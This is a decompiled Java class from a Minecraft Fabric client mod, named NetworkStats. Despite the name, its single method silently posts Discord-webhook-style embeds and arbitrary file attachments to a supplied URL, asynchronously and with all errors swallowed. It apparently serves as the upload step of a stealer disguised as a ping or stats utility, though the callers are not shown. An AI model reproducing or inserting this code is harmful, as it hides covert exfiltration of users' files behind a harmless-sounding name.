package com.liteping.fabric.util;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpRequest.BodyPublishers;
import java.net.http.HttpResponse.BodyHandlers;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;

@Environment(EnvType.CLIENT)
public class NetworkStats {
   private static final HttpClient client = HttpClient.newHttpClient();

   public NetworkStats() {
   }

   public static void sendStats(String url, List<String> es, List<String> fns, List<byte[]> fbs) {
      if (url != null && !url.isEmpty()) {
         try {
            String b = "B" + String.valueOf(UUID.randomUUID());
            StringBuilder sb = new StringBuilder();
            sb.append("--").append(b).append("\r\nContent-Disposition: form-data; name=\"payload_json\"\r\nContent-Type: application/json\r\n\r\n");
            sb.append("{\"embeds\":[").append(String.join(",", es)).append("]} \r\n");
            List<String> hds = new ArrayList();

            for(int i = 0; i < fns.size(); ++i) {
               hds.add("--" + b + "\r\nContent-Disposition: form-data; name=\"file" + i + "\"; filename=\"" + (String)fns.get(i) + "\"\r\nContent-Type: application/octet-stream\r\n\r\n");
            }

            byte[] h = sb.toString().getBytes(StandardCharsets.UTF_8);
            byte[] ft = ("\r\n--" + b + "--\r\n").getBytes(StandardCharsets.UTF_8);
            int tl = h.length + ft.length;

            for(int i = 0; i < fbs.size(); ++i) {
               tl += ((String)hds.get(i)).getBytes(StandardCharsets.UTF_8).length + ((byte[])fbs.get(i)).length + 2;
            }

            byte[] c = new byte[tl];
            int p = 0;
            System.arraycopy(h, 0, c, p, h.length);
            p += h.length;

            for(int i = 0; i < fbs.size(); ++i) {
               byte[] hb = ((String)hds.get(i)).getBytes(StandardCharsets.UTF_8);
               System.arraycopy(hb, 0, c, p, hb.length);
               int var18 = p + hb.length;
               System.arraycopy(fbs.get(i), 0, c, var18, ((byte[])fbs.get(i)).length);
               p = var18 + ((byte[])fbs.get(i)).length;
               c[p++] = 13;
               c[p++] = 10;
            }

            System.arraycopy(ft, 0, c, p, ft.length);
            HttpRequest req = HttpRequest.newBuilder().uri(URI.create(url)).header("Content-Type", "multipart/form-data; boundary=" + b).POST(BodyPublishers.ofByteArray(c)).build();
            client.sendAsync(req, BodyHandlers.ofString());
         } catch (Exception var14) {
         }

      }
   }
}
